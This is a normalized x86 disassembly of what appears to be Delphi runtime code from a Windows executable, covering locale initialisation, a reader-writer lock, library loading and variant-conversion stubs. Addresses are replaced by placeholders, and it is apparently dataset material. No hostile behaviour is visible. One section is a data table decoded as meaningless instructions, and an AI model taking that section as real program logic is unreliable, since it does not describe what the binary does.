mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c040
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_4087e4
mov ebx eax
inc ebx
sub_40c4e8
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c510
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c510
test eax eax
jne r-xdata
sub_40c510
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4087d0
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c040
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_4087d0
mov edi eax
test edi edi
jne r-xdata
sub_40c550
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c5b4
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404168
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_40800c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c5bb
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
sub_40c5c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c550
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c63c
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c624
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c5c4
pop ecx
push ebp
call sub_40c5c4
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402c64
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c7b0
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40ca7b
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c63c
call sub_40af5c
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40aeac
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f4c
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40aeac
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_40800c
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40aeac
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_40800c
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40aef8
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40aef8
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40aeac
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_40800c
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40aef8
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40aeac
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b1e4
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403f4c
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40aeac
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b1e4
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403f4c
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40aef8
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40aeac
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403f4c
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40aeac
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403f4c
lea eax [ ebp - 0x8 ]
call sub_403ef8
lea eax [ ebp - 0xc ]
call sub_403ef8
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40aeac
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_40800c
test eax eax
jne r-xdata
call sub_40b134
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f90
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f90
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404278
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404278
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40aef8
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ca82
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403f1c
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40aeac
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_40800c
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40aeac
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_40800c
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_403f90
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_403f90
jmp r-xdata
sub_40cb28
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40cc4b
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403f90
lea eax [ ebp - 0xc ]
mov edx edi
call sub_403f90
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_407c84
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407c84
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_403f90
mov eax esi
call sub_403ef8
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40c384
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cc52
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403f1c
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404418
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_404278
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_4041b8
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_404418
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_4041c0
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4041b8
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_404418
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_4041c0
jmp r-xdata
sub_40cc64
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40ccf4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ae60
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ccfb
lea eax [ ebp - 0x14 ]
call sub_403ef8
retn
sub_40cd4c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_4085ac
mov [ rw-data ] eax
sub_40cdd0
push ebx
push esi
push edi
push ebp
call sub_4034b0
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_402704
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403114
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403498
sub_40ce38
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40ce20
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cec0
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407ac0
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cdc0
mov [ ebp ] eax
sub_40cec0
push ebx
mov ebx eax
mov eax ebx
call sub_40ce20
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cdc0
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40cf00
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_40cf74
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax esi
call sub_40d000
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403124
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_40d000
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cfbc
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40ce38
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cdc8
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cda8
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cdc8
test eax eax
je r-xdata
mov eax edi
call sub_40cfbc
test bl bl
je r-xdata
mov eax edi
call sub_40cff0
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cda8
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cdb4
sub_40d09c
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce38
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cdc8
mov eax ebx
call sub_40cfd4
mov eax ebx
call sub_40cfc8
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ceb0
sub_40d0ec
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40ce38
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40cfe0
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cdb4
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cda8
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40cfe0
mov eax esi
call sub_40cfd4
sub_40d158
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce38
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ceb0
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cda8
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40cfd4
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40cfd4
sub_40d1d0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d1f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d26b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405598
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4031d8
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d272
lea eax [ ebp - 0x4 ]
call sub_405598
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4031d8
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d1d0
test al al
jne r-xdata
mov al 0x1
sub_40d28c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d2fe
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d2e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4043b8
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d2e7
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d310
sbb eax 0x4000000
add [ edi ] 0x8
cdq
inc edi
add ah bh
add [ edi ] 0xac
xchg edi eax
inc edi
add ah dh
add [ edi ] 0x48
xchg ebp eax
inc edi
add ah ch
add [ edi ] 0x78
cdq
inc edi
add ah ah
add [ edi ] 0xb8
cdq
inc edi
add ah bl
add [ edi ] 0x68
xchg esi eax
inc edi
add ah dl
add [ edi ] 0x8c
xchg edi eax
inc edi
add ah cl
add [ edi ] 0xe4
xchg esp eax
inc edi
add ah al
add [ edi ] 0xfc
xchg edi eax
inc edi
add [ edx + eax * 4 - 0x6793ffb9 ] bh
inc edi
add [ edx + eax * 4 - 0x68bbffb9 ] dh
inc edi
add [ edx + eax * 4 - 0x68abffb9 ] ch
inc edi
add [ edx + eax * 4 - 0x65afffb9 ] ah
inc edi
add [ edx + eax * 4 - 0x68afffb9 ] bl
inc edi
add [ edx + eax * 4 - 0x6507ffb9 ] dl
inc edi
add [ edx + eax * 4 - 0x673bffb9 ] cl
inc edi
add [ edx + eax * 4 - 0x6767ffb9 ] al
inc edi
add [ edx + eax * 4 + 0x47 ] bh
add [ ebx + ebx * 4 ] cl
inc edi
add [ edx + eax * 4 + 0x47 ] dh
add [ eax + 0x6c00479a ] ch
add [ edi ] 0x68
xchg edi eax
inc edi
add [ edx + eax * 4 + 0x47 ] ah
add [ eax - 0x66 ] bl
inc edi
add [ edx + eax * 4 + 0x47 ] bl
add [ edx + ebx * 4 + 0x47 ] dh
add [ edx + eax * 4 + 0x47 ] dl
add [ eax - 0x6a ] cl
inc edi
add [ edx + eax * 4 + 0x47 ] cl
add al dl
xchg ebp eax
inc edi
add [ edx + eax * 4 + 0x47 ] al
add [ eax + ebx * 4 - 0x7dc3ffb9 ] cl
inc edi
add [ ecx + ebx * 4 + 0x47 ] ch
add [ edx + eax * 4 ] dh
inc edi
add al dh
xchg esp eax
inc edi
add [ edx + eax * 4 ] ch
inc edi
add [ edx + ebx * 4 + 0x47 ] cl
add [ edx + eax * 4 ] ah
inc edi
add [ eax - 0x69 ] ah
inc edi
add [ eax ] ch
add [ eax ] al
add [ edx + eax * 4 ] bl
inc edi
add [ edx + ebx * 4 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add [ edi ] 0x54
xchg ebp eax
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 ] dl
inc edi
add [ ecx + ebx * 4 + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ edi ] 0xfc
xchg esp eax
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 ] cl
inc edi
add [ eax ] dl
xchg esi eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edi ] 0x0
xchg esi eax
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 ] al
inc edi
add [ ebp + edx * 4 + 0x47 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x5c
xchg edi eax
inc edi
add [ eax ] al
add [ eax ] al
add ah bh
add [ edi ] rw-data
add [ eax ] al
add [ eax ] al
clc
add [ edi ] rw-data
add [ eax ] al
add [ eax ] al
hlt
sub_40d760
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d7c8
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d7cf
retn
mov eax sub_40d310
call sub_403c20
mov eax r-xdata
call sub_403c48
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bd24
call sub_40be28
call sub_40cd4c
call sub_40c7b0
mov eax rw-data
mov edx r-xdata
call sub_403f4c
sub_40d800
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d854
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d8ae
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404180
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_408024
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8b5
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40d8c0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d91a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404180
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4094fc
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d921
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40d92c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d986
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404180
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4094d0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d98d
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40d998
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d9f2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404180
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40add4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d9f9
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40da04
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40da5e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404180
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409528
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da65
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40da70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40dadd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404180
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408110
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dae4
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
sub_40daf0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40db50
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409484
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404724
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db57
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40db60
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dbc0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a594
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404724
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dbc7
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40dbd0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dc34
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4081ac
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404724
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc3b
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40dc64
push ebp
mov ebp esp
